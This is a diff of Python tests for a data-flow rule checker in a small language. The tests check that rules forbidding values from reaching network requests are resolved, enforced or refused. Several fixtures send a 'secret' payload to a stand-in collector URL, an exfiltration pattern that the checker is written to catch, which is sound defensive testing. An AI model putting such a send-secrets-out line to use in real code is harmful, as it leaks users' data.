@@ -206,6 +206,14 @@ def test_computed_target_is_treated_as_a_possible_match():
 
 
 def test_named_subject_raises_rather_than_passing_silently():
+    """No variable named 'readings' exists anywhere in this program, so
+    the subject cannot resolve to anything the derivation graph reaches.
+
+    The message text changed from "not yet supported" (the old blanket
+    refusal) to "does not resolve" once the checker gained the ability to
+    trace derivation — the safety guarantee is the same: this program must
+    not report clean against this rule.
+    """
     src = ('use http\n'
            'rule [readings-stay-local] readings may not ask\n'
            'x = ask "https://example.com/a.json"\n')
@@ -217,7 +225,110 @@ def test_named_subject_raises_rather_than_passing_silently():
         assert False, "should raise, not report clean"
     except RuleNotSupported as e:
         assert "readings" in str(e)
-        assert "not yet supported" in str(e)
+        assert "does not resolve" in str(e)
+
+
+def test_named_subject_resolves_and_checks_in_the_same_file():
+    """The subject names a function parameter whose value provably reaches
+    the ask — resolved in this file, so the rule is checkable (P-Q16).
+
+    `send`'s ask appears twice in `.declared`: once as the function's
+    generic (computed) surface, once as the top-level call's specialised
+    (exact) target — a pre-existing shapes.py dedup granularity, unrelated
+    to named-subject resolution. Both must be real violations of the same
+    rule; the exact count of that duplication is not this test's concern.
+    """
+    src = ('use http\n'
+           'to send of payload:\n'
+           '  give ask "https://collector.example.com/?d=" + payload\n\n'
+           'rule [no-payload-leak] payload may not ask\n'
+           'x = send of "secret"\n')
+    v = rule_violations(src)
+    assert len(v) >= 1
+    assert all(viol.rule.name == "no-payload-leak" for viol in v)
+    assert all(viol.is_violation for viol in v)
+
+
+def test_named_subject_in_an_imported_file_is_not_supported():
+    """The parameter 'payload' is bound in lib.planes, not in main.planes
+    where the rule is written — a rule cannot reach across an import
+    boundary to a name it never saw declared (P-Q18)."""
+    from shapes import analyse_file as af
+    import os
+
+    d = "demo/_deriv_subject"
+    os.makedirs(d, exist_ok=True)
+    open(os.path.join(d, "lib.planes"), "w").write(
+        'use http\n'
+        'to send of payload:\n'
+        '  give ask "https://collector.example.com/?d=" + payload\n')
+    open(os.path.join(d, "main.planes"), "w").write(
+        'use lib\n'
+        'rule [no-leak] payload may not ask\n'
+        'x = send of "secret"\n')
+    try:
+        main_path = os.path.join(d, "main.planes")
+        surface = af(main_path)
+        prog = parse(open(main_path).read())
+        found = [s for s in prog if isinstance(s, Rule)]
+        try:
+            check(found, surface, declaring_file=os.path.abspath(main_path))
+            assert False, "should raise, not report clean"
+        except RuleNotSupported as e:
+            msg = str(e)
+            assert "payload" in msg
+            assert "lib.planes" in msg
+    finally:
+        import shutil
+        shutil.rmtree(d, ignore_errors=True)
+
+
+def test_named_subject_unresolvable_does_not_report_clean():
+    src = ('use http\n'
+           'rule [x] nonexistent-name may not ask\n'
+           'y = ask "https://example.com/a.json"\n')
+    prog = parse(src)
+    found = [s for s in prog if isinstance(s, Rule)]
+    surface = analyse(src)
+    try:
+        check(found, surface)
+        assert False, "should raise, not report clean"
+    except RuleNotSupported as e:
+        assert "nonexistent-name" in str(e)
+
+
+def test_rules_module_imports_only_hashlib():
+    """§8's duck-typing claim, asserted directly rather than only reviewed."""
+    import ast
+    tree = ast.parse(open("rules.py").read())
+    imports = set()
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            imports.update(alias.name for alias in node.names)
+        elif isinstance(node, ast.ImportFrom):
+            imports.add(node.module)
+    assert imports == {"hashlib"}
+
+
+def test_violation_render_includes_derivation_line_when_traceable():
+    src = ('use http\n'
+           'to send of payload:\n'
+           '  give ask "https://collector.example.com/?d=" + payload\n\n'
+           'rule [no-leak] anything may not ask\n'
+           'x = send of "secret"\n')
+    v = rule_violations(src)
+    rendered = v[0].render()
+    assert "derived from:" in rendered
+    assert "payload" in rendered
+
+
+def test_violation_render_omits_derivation_line_when_not_traceable():
+    src = ('use http\n'
+           'rule [no-net] anything may not ask\n'
+           'x = ask "https://example.com/a.json"\n')
+    v = rule_violations(src)
+    rendered = v[0].render()
+    assert "derived from:" not in rendered
 
 
 # ================================================================ narrows / supersedes / conflict
